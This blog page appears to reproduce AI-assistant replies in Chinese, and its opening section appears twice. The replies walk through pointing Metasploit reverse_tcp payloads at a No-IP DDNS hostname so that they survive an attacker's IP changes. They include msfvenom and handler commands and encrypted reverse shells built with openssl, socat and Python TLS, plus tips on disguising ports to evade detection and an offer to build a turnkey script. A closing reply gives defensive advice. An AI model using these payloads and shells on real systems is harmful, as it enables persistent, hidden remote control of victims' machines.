<td>需有自己域名</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<hr>
<h2>4. 设置 DDNS（以 No-IP 为例）</h2>
<h3>4.1 注册域名</h3>
<ul>
<li>
<p>注册 <a href="https://www.noip.com/" rel="nofollow">No-IP</a></p>
</li>
<li>
<p>登录后台 → 添加主机名 → 选择免费域名（如 <code class="notranslate">myhacker.ddns.net</code>）</p>
</li>
<li>
<p>记录下 <strong>域名</strong> 和账号密码</p>
</li>
</ul>
<h3>4.2 安装 DDNS 客户端（Kylin / Kali）</h3>
<pre class="notranslate"><code class="notranslate"># 下载 No-IP Linux 客户端
wget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz
tar zxvf noip-duc-linux.tar.gz
cd noip-2.1.9-1
<h1>编译安装</h1>
<p>make<br>
sudo make install</p>
<h1>配置（输入你的 No-IP 账号、密码、更新间隔）</h1>
<p>sudo /usr/local/bin/noip2 -C</p>
<h1>启动 DDNS 客户端</h1>
</code><p><code class="notranslate">sudo /usr/local/bin/noip2<br>
</code></p></pre><p></p>
<h3>4.3 验证</h3>
<pre class="notranslate"><code class="notranslate">ping myhacker.ddns.net
</code></pre>
<p>如果能解析到你的公网 IP，说明绑定成功。</p>
<hr>
<h2>5. 在 Metasploit 中替换固定 IP</h2>
<p>假设你原来这样生成 Payload：</p>
<pre class="notranslate"><code class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.45.67.89 LPORT=4444 -f exe -o payload.exe
</code></pre>
<p>改成域名：</p>
<pre class="notranslate"><code class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=myhacker.ddns.net LPORT=4444 -f exe -o payload.exe
</code></pre>
<p>监听时同样替换：</p>
<pre class="notranslate"><code class="notranslate">msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST myhacker.ddns.net
set LPORT 4444
run
</code></pre>
<p><strong>效果</strong><br>
即使你的公网 IP 变了，只要 DDNS 客户端更新成功，Payload 依然能连接回来。</p>
<hr>
<h2>6. 注意事项</h2>
<ul>
<li>
<p><strong>防火墙端口映射（NAT 转发）</strong>：如果攻击机在路由器后面，需要在路由器上把 LPORT（如 4444）映射到你的内网 IP。</p>
</li>
<li>
<p><strong>公网 IP</strong>：移动宽带、4G/5G 常用 CGNAT（共享公网 IP），需使用 VPS 中转或反向隧道（FRP、Ngrok）。</p>
</li>
<li>
<p><strong>域名解析延迟</strong>：免费 DDNS 更新到全网 DNS 可能有几秒到几分钟延迟。</p>
</li>
<li>
<p><strong>实验隔离</strong>：DDNS 域名可能被杀软记录，务必在实验环境中使用。</p>
</li>
</ul>
<hr>
<h2>7. 实验流程分终端示例</h2>
<h3>终端 1（攻击机 - 麒麟/Kali）</h3>
<pre class="notranslate"><code class="notranslate"># 运行 DDNS 客户端
sudo noip2
# 启动 Metasploit 监听
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST myhacker.ddns.net
set LPORT 5555
run
</code></pre>
<h3>终端 2（生成 Payload）</h3>
<pre class="notranslate"><code class="notranslate">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=myhacker.ddns.net LPORT=5555 -f elf -o kylin_payload.elf
</code></pre>
<h3>终端 3（靶机 - 麒麟/Windows）</h3>
<pre class="notranslate"><code class="notranslate">chmod +x kylin_payload.elf
./kylin_payload.elf
</code></pre>
<hr>
<p>我可以帮你画一个 <strong>DDNS 在 Metasploit 攻击链中的流程图</strong>，<br>
把“IP变化 → DDNS更新 → Payload连接”的过程直观画出来。<br>
这样你一看就能明白为什么替换固定 IP 成域名可以一直用。</p>
<p>你要我帮你画吗？这样比纯文字更清晰。</p>

好，我给你详细解释一下 **动态域名解析（DDNS）替换固定 IP 地址** 的原理、用途、在渗透测试/Metasploit 里的使用方法，以及分步骤的实操流程，让你可以在实验中直接把固定 IP 改成域名进行远程连接。
<hr>
<h2>1. 为什么要用动态域名（DDNS）替换固定 IP</h2>
<p>在很多场景下：</p>
<ul>
<li>攻击机/服务器 <strong>没有固定公网 IP</strong>（家庭宽带、4G/5G 热点、云主机动态分配）</li>
<li>你的公网 IP <strong>会随着重启路由器、断网重连而改变</strong></li>
<li>目标机的 Payload 如果硬编码了旧 IP，会失效</li>
</ul>
<p><strong>解决办法</strong><br>
使用 DDNS（Dynamic Domain Name System）服务，把你的公网 IP 绑定到一个域名（如 <code class="notranslate">attacker.ddns.net</code>），即使公网 IP 变化，域名仍然指向最新 IP。</p>
<hr>
<h2>2. DDNS 原理</h2>
<ol>
<li><strong>注册一个 DDNS 域名</strong>（如 <code class="notranslate">mytest.ddns.net</code>）。</li>
<li><strong>在本地或云端运行 DDNS 客户端</strong>，定时检测你的公网 IP。</li>
<li><strong>IP 变化时自动更新 DNS 记录</strong>，使域名总是指向你最新的公网 IP。</li>
<li>在 Payload / Metasploit 监听器里，使用域名代替 IP，即可免去手动修改 IP。</li>
</ol>
<hr>
<h2>3. 常用 DDNS 服务</h2>
<markdown-accessiblity-table><table role="table">
<thead>
<tr>
<th>服务商</th>
<th>免费</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong><a href="https://www.noip.com/" rel="nofollow">No-IP</a></strong> (noip.com)</td>
<td>免费版 30 天需手动续期</td>
<td>常用、简单</td>
</tr>
<tr>
<td><strong>DuckDNS</strong> (duckdns.org)</td>
<td>永久免费</td>
<td>API 更新方便</td>
</tr>
<tr>
<td><strong>Dynu</strong> (dynu.com)</td>
<td>免费版支持多个域名</td>
<td>支持多平台</td>
</tr>
<tr>
<td><strong>Cloudflare API</strong></td>
<td>免费</td>
<td>需有自己域名</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<hr>
<h2>4. 设置 DDNS（以 No-IP 为例）</h2>
<h3>4.1 注册域名</h3>
<ul>
<li>注册 <a href="https://www.noip.com/" rel="nofollow">No-IP</a></li>
<li>登录后台 → 添加主机名 → 选择免费域名（如 <code class="notranslate">myhacker.ddns.net</code>）</li>
<li>记录下 <strong>域名</strong> 和账号密码</li>
</ul>
<h3>4.2 安装 DDNS 客户端（Kylin / Kali）</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 下载 No-IP Linux 客户端</span>
wget http://www.no-ip.com/client/linux/noip-duc-linux.tar.gz
tar zxvf noip-duc-linux.tar.gz
<span class="pl-c1">cd</span> noip-2.1.9-1

<span class="pl-c"><span class="pl-c">#</span> 编译安装</span>
make
sudo make install

<span class="pl-c"><span class="pl-c">#</span> 配置（输入你的 No-IP 账号、密码、更新间隔）</span>
sudo /usr/local/bin/noip2 -C

<span class="pl-c"><span class="pl-c">#</span> 启动 DDNS 客户端</span>
sudo /usr/local/bin/noip2</pre></div>
<h3>4.3 验证</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">ping myhacker.ddns.net</pre></div>
<p>如果能解析到你的公网 IP，说明绑定成功。</p>
<hr>
<h2>5. 在 Metasploit 中替换固定 IP</h2>
<p>假设你原来这样生成 Payload：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=123.45.67.89 LPORT=4444 -f exe -o payload.exe</pre></div>
<p>改成域名：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfvenom -p windows/meterpreter/reverse_tcp LHOST=myhacker.ddns.net LPORT=4444 -f exe -o payload.exe</pre></div>
<p>监听时同样替换：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfconsole
use exploit/multi/handler
<span class="pl-c1">set</span> payload windows/meterpreter/reverse_tcp
<span class="pl-c1">set</span> LHOST myhacker.ddns.net
<span class="pl-c1">set</span> LPORT 4444
run</pre></div>
<p><strong>效果</strong><br>
即使你的公网 IP 变了，只要 DDNS 客户端更新成功，Payload 依然能连接回来。</p>
<hr>
<h2>6. 注意事项</h2>
<ul>
<li><strong>防火墙端口映射（NAT 转发）</strong>：如果攻击机在路由器后面，需要在路由器上把 LPORT（如 4444）映射到你的内网 IP。</li>
<li><strong>公网 IP</strong>：移动宽带、4G/5G 常用 CGNAT（共享公网 IP），需使用 VPS 中转或反向隧道（FRP、Ngrok）。</li>
<li><strong>域名解析延迟</strong>：免费 DDNS 更新到全网 DNS 可能有几秒到几分钟延迟。</li>
<li><strong>实验隔离</strong>：DDNS 域名可能被杀软记录，务必在实验环境中使用。</li>
</ul>
<hr>
<h2>7. 实验流程分终端示例</h2>
<h3>终端 1（攻击机 - 麒麟/Kali）</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 运行 DDNS 客户端</span>
sudo noip2
<span class="pl-c"><span class="pl-c">#</span> 启动 Metasploit 监听</span>
msfconsole
use exploit/multi/handler
<span class="pl-c1">set</span> payload linux/x64/meterpreter/reverse_tcp
<span class="pl-c1">set</span> LHOST myhacker.ddns.net
<span class="pl-c1">set</span> LPORT 5555
run</pre></div>
<h3>终端 2（生成 Payload）</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=myhacker.ddns.net LPORT=5555 -f elf -o kylin_payload.elf</pre></div>
<h3>终端 3（靶机 - 麒麟/Windows）</h3>
<div class="highlight highlight-source-shell"><pre class="notranslate">chmod +x kylin_payload.elf
./kylin_payload.elf</pre></div>
<hr>
<p>我可以帮你画一个 <strong>DDNS 在 Metasploit 攻击链中的流程图</strong>，<br>
把“IP变化 → DDNS更新 → Payload连接”的过程直观画出来。<br>
这样你一看就能明白为什么替换固定 IP 成域名可以一直用。</p>
<p>你要我帮你画吗？这样比纯文字更清晰。</p>
<p>我给你拆开讲一下 <strong>反弹回来的监听加密</strong>（Reverse Shell + Encryption）这个概念，帮你从原理到实现思路弄清楚。</p>
<hr>
<h2>1. 背景概念</h2>
<ul>
<li>
<p><strong>反弹监听（Reverse Shell）</strong><br>
通常我们用 <code class="notranslate">nc -lvp 端口</code> 是 <strong>被动监听</strong>，等别人连接上来。<br>
而反弹监听是 <strong>主动连接</strong> 的方式，比如目标机器主动连接你的监听机，把它的 Shell 输入输出通过 TCP/UDP 发回来。</p>
</li>
<li>
<p><strong>加密传输（Encryption）</strong><br>
反弹回来的 Shell 数据如果是明文，网络上任何能截获数据的人都可以看到命令和输出。<br>
通过加密（例如 TLS/SSL、AES），可以防止中间人嗅探。</p>
</li>
</ul>
<hr>
<h2>2. 常见实现方式</h2>
<h3>方式一：OpenSSL 反弹加密</h3>
<ul>
<li>
<p><strong>监听端（攻击机）</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 生成证书（只需一次）</span>
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes

<span class="pl-c"><span class="pl-c">#</span> 开启加密监听</span>
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</pre></div>
</li>
<li>
<p><strong>反弹端（目标机）</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">mkfifo /tmp/f<span class="pl-k">;</span> /bin/sh -i <span class="pl-k">&lt;</span> /tmp/f <span class="pl-k">2&gt;&amp;1</span> <span class="pl-k">|</span> openssl s_client -quiet -connect 攻击机IP:4444 <span class="pl-k">&gt;</span> /tmp/f</pre></div>
</li>
</ul>
<p>优点：加密由 OpenSSL 自动完成，简单。<br>
缺点：需要 OpenSSL 工具。</p>
<hr>
<h3>方式二：利用 Socat + SSL</h3>
<ul>
<li>
<p><strong>监听端</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 生成证书</span>
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
cat key.pem cert.pem <span class="pl-k">&gt;</span> full.pem

<span class="pl-c"><span class="pl-c">#</span> SSL 加密监听</span>
socat OPENSSL-LISTEN:4444,cert=full.pem,verify=0 -</pre></div>
</li>
<li>
<p><strong>反弹端</strong></p>
<div class="highlight highlight-source-shell"><pre class="notranslate">socat EXEC:/bin/bash,pty,stderr,setsid,sigint,sane OPENSSL:攻击机IP:4444,verify=0</pre></div>
</li>
</ul>
<p>优点：稳定、支持多平台。<br>
缺点：需要 socat 工具。</p>
<hr>
<h3>方式三：自定义 Python AES/TLS 反弹</h3>
<p>Python 可以直接用 <code class="notranslate">ssl</code> 或 <code class="notranslate">cryptography</code> 实现加密的反弹监听。<br>
下面是一个 <strong>Python TLS 反弹 shell</strong> 的简化示例：</p>
<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">socket</span>, <span class="pl-s1">ssl</span>, <span class="pl-s1">subprocess</span>, <span class="pl-s1">os</span>, <span class="pl-s1">pty</span>

<span class="pl-c"># 连接攻击机并启用TLS</span>
<span class="pl-s1">context</span> <span class="pl-c1">=</span> <span class="pl-s1">ssl</span>.<span class="pl-c1">create_default_context</span>()
<span class="pl-s1">s</span> <span class="pl-c1">=</span> <span class="pl-s1">socket</span>.<span class="pl-c1">create_connection</span>((<span class="pl-s">"攻击机IP"</span>, <span class="pl-c1">4444</span>))
<span class="pl-s1">ssock</span> <span class="pl-c1">=</span> <span class="pl-s1">context</span>.<span class="pl-c1">wrap_socket</span>(<span class="pl-s1">s</span>, <span class="pl-s1">server_hostname</span><span class="pl-c1">=</span><span class="pl-s">"攻击机IP"</span>)

<span class="pl-c"># 获取交互shell</span>
<span class="pl-s1">os</span>.<span class="pl-c1">dup2</span>(<span class="pl-s1">ssock</span>.<span class="pl-c1">fileno</span>(), <span class="pl-c1">0</span>)
<span class="pl-s1">os</span>.<span class="pl-c1">dup2</span>(<span class="pl-s1">ssock</span>.<span class="pl-c1">fileno</span>(), <span class="pl-c1">1</span>)
<span class="pl-s1">os</span>.<span class="pl-c1">dup2</span>(<span class="pl-s1">ssock</span>.<span class="pl-c1">fileno</span>(), <span class="pl-c1">2</span>)
<span class="pl-s1">pty</span>.<span class="pl-c1">spawn</span>(<span class="pl-s">"/bin/bash"</span>)</pre></div>
<p>监听端可以用：</p>
<div class="highlight highlight-source-shell"><pre class="notranslate">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</pre></div>
<hr>
<h2>3. 注意事项</h2>
<ol>
<li>
<p><strong>安全性</strong></p>
<ul>
<li>加密可以防止流量被嗅探，但不能防止目标主机本地被取证。</li>
<li>如果证书验证没做好，容易被中间人劫持。</li>
</ul>
</li>
<li>
<p><strong>隐蔽性</strong></p>
<ul>
<li>端口可以伪装成常见服务（443/8443）以避免被防火墙拦截。</li>
<li>可以结合动态域名解析（DDNS）替代固定IP（你刚才问过的）。</li>
</ul>
</li>
<li>
<p><strong>法律合规</strong></p>
<ul>
<li>仅能在授权的安全测试、内网运维、合法渗透环境使用，禁止用于未授权目标。</li>
</ul>
</li>
</ol>
<hr>
<p>如果你愿意，我可以帮你写一个 <strong>支持动态域名 + 加密的反弹监听一体化脚本</strong>，这样就可以不依赖固定 IP，自动用 TLS 加密连接。<br>
这样你就能把“动态域名解析地址替换固定IP”+“反弹监听加密”结合起来用。</p>
<p>你是想让我帮你直接写这个成品脚本吗？这样就一步到位了。</p>
<p>是的，<strong>如果你只做了动态域名解析（DDNS）并开放了端口</strong>，那么只要别人知道这个<strong>域名 + 端口</strong>，并且你的防火墙/路由器允许，就有可能连上你电脑的服务。</p>
<p>这会带来两个问题：</p>
<ol>
<li><strong>安全风险</strong>：任何人都能尝试连接，可能被扫描、爆破、利用漏洞。</li>
<li><strong>非法连接</strong>：你不想要的陌生设备可能连进来。</li>
</ol>
<hr>
<h2>🔒 如何解决其他电脑随便连接的问题</h2>
<h3>1. <strong>使用加密 + 身份验证</strong></h3>
<ul>
<li>如果是 Web 服务，用 <strong>HTTPS + 用户名密码</strong>。</li>
<li>如果是 Socket/自定义协议，用 <strong>TLS/SSL 加密通道</strong>，并在握手阶段做 <strong>用户身份验证</strong>（token / 密钥）。</li>
<li>甚至可以用 <strong>双向证书认证（Mutual TLS）</strong>，让客户端也要出示有效证书才被允许。</li>
</ul>
<p>✅ 优点：即使别人知道域名和端口，没有正确的密钥或证书也无法通信。</p>
<hr>
<h3>2. <strong>限制允许访问的 IP</strong></h3>
<ul>
<li>在服务器防火墙（Windows 防火墙 / iptables）上设置 <strong>白名单 IP</strong>。</li>
<li>这样，只有你信任的设备 IP 才能连进来，其他直接被拒绝。</li>
</ul>
<p>❗ 缺点：适合固定 IP，如果对方也是动态 IP，可以结合 DDNS 再做动态白名单更新。</p>
<hr>
<h3>3. <strong>使用 VPN 内网穿透</strong></h3>
<ul>
<li>不直接暴露服务端口，而是通过 VPN（如 <strong>WireGuard</strong>、<strong>OpenVPN</strong>）让指定设备组成虚拟内网。</li>
<li>外部的人即使知道你的域名和端口，也进不来，因为端口只在 VPN 内可访问。</li>
</ul>
<hr>
<h3>4. <strong>端口隐藏 + 动态变化</strong></h3>
<ul>
<li>避免用常见端口（如 22、80、3389），改成高位端口（随机端口）。</li>
<li>可以结合**端口敲门（Port Knocking）**技术——客户端先按预设顺序访问几个隐藏端口，防火墙才临时开放真实端口。</li>
</ul>
<hr>
<h3>5. <strong>应用层安全策略</strong></h3>
<ul>
<li>如果你的服务是 Web/Socket/数据库，可以在应用代码里判断来源、做 token 校验、限制连接数、自动封禁异常请求。</li>
</ul>
<hr>
<p>💡 总结：<br>
如果只是做了 DDNS，安全性几乎等于<strong>裸奔公网</strong>。<br>
最佳做法是：</p>
<blockquote>
<p><strong>VPN（WireGuard） + TLS加密 + 访问控制白名单</strong><br>
这样就算别人知道域名和端口，也连不上，更不会暴露服务细节。</p>
</blockquote>
<hr>
<p>如果你愿意，我可以帮你画一个 <strong>动态域名+加密+防火墙白名单的安全连接架构图</strong>，让你直观看懂整个过程。<br>
这样你以后不管是远程桌面、SSH，还是数据库访问，都能安全用公网连接。</p></div>
<div style="font-size:small;margin-top:8px;float:right;"></div>

<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
<div class="comments" id="comments"></div>

</div>
    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://binghey.github.io/blog">知行合一笔记</a></div>
<div id="footer2">
    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
</div>

<script>
var now=new Date();
document.getElementById("copyrightYear").innerHTML=now.getFullYear();

if(""!=""){
    var startSite=new Date("");
    var diff=now.getTime()-startSite.getTime();
    var diffDay=Math.floor(diff/(1000*60*60*24));
    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
}
</script></div>
</body>
<script>
var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
var utterancesLoad=0;

let themeSettings={
    "dark": ["dark","moon","#00f0ff","dark-blue"],
    "light": ["light","sun","#ff5000","github-light"],
    "auto": ["auto","sync","","preferred-color-scheme"]
};
function changeTheme(mode, icon, color, utheme){
    document.documentElement.setAttribute("data-color-mode",mode);
    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
    document.getElementById("themeSwitch").parentNode.style.color=color;
    if(utterancesLoad==1){utterancesTheme(utheme);}
}
function modeSwitch(){
    let currentMode=document.documentElement.getAttribute('data-color-mode');
    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
    localStorage.setItem("meek_theme", newMode);
    if(themeSettings[newMode]){
        changeTheme(...themeSettings[newMode]);
    }
}
function utterancesTheme(theme){
    const message={type:'set-theme',theme: theme};
    const iframe=document.getElementsByClassName('utterances-frame')[0];
    iframe.contentWindow.postMessage(message,'https://utteranc.es');
}
if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
</script>

<script>
document.getElementById("pathHome").setAttribute("d",IconList["home"]);
document.getElementById("pathIssue").setAttribute("d",IconList["github"]);



function openComments(){
    cm=document.getElementById("comments");
    cmButton=document.getElementById("cmButton");
    cmButton.innerHTML="loading";
    span=document.createElement("span");
    span.setAttribute("class","AnimatedEllipsis");
    cmButton.appendChild(span);

    script=document.createElement("script");
    script.setAttribute("src","https://utteranc.es/client.js");
    script.setAttribute("repo","binghey/blog");
    script.setAttribute("issue-term","title");
    
    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
    else{script.setAttribute("theme","preferred-color-scheme");}
    
    script.setAttribute("crossorigin","anonymous");
    script.setAttribute("async","");
    cm.appendChild(script);

    int=self.setInterval("iFrameLoading()",200);
}

function iFrameLoading(){
    var utterances=document.getElementsByClassName('utterances');
    if(utterances.length==1){
        if(utterances[0].style.height!=""){
            utterancesLoad=1;
            int=window.clearInterval(int);
            document.getElementById("cmButton").style.display="none";
            console.log("utterances Load OK");
        }
    }
}

document.addEventListener('DOMContentLoaded', () => {
    const createClipboardHTML = (codeContent, additionalClasses = '') => `
        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
            </clipboard-copy>
            <div class="copy-feedback">Copied!</div>
        </div>
    `;

    const handleCodeElements = (selector = '') => {
        document.querySelectorAll(selector).forEach(codeElement => {
            const codeContent = codeElement.innerHTML;
            const newStructure = document.createElement('div');
            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
            newStructure.innerHTML = createClipboardHTML(codeContent);

            const parentElement = codeElement.parentElement;
            if (selector.includes('highlight')) {
                parentElement.insertBefore(newStructure, codeElement.nextSibling);
                parentElement.removeChild(codeElement);
            } else {
                parentElement.parentElement.replaceChild(newStructure, parentElement);
            }
        });
    };

    handleCodeElements('pre.notranslate > code.notranslate');
    handleCodeElements('div.highlight > pre.notranslate');

    let currentFeedback = null;
    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
        copyButton.addEventListener('click', () => {
            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
            const tempTextArea = document.createElement('textarea');
            tempTextArea.value = codeContent;
            document.body.appendChild(tempTextArea);
            tempTextArea.select();
            document.execCommand('copy');
            document.body.removeChild(tempTextArea);

            const copyIcon = copyButton.querySelector('.octicon-copy');
            const checkIcon = copyButton.querySelector('.octicon-check');
            const copyFeedback = copyButton.nextElementSibling;

            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
            currentFeedback = copyFeedback;

            copyIcon.classList.add('d-none');
            checkIcon.classList.remove('d-none');
            copyFeedback.style.display = 'block';
            copyButton.style.borderColor = 'var(--color-success-fg)';

            setTimeout(() => {
                copyIcon.classList.remove('d-none');
                checkIcon.classList.add('d-none');
                copyFeedback.style.display = 'none';
                copyButton.style.borderColor = '';
            }, 2000);
        });
    });
});

</script>


</html>
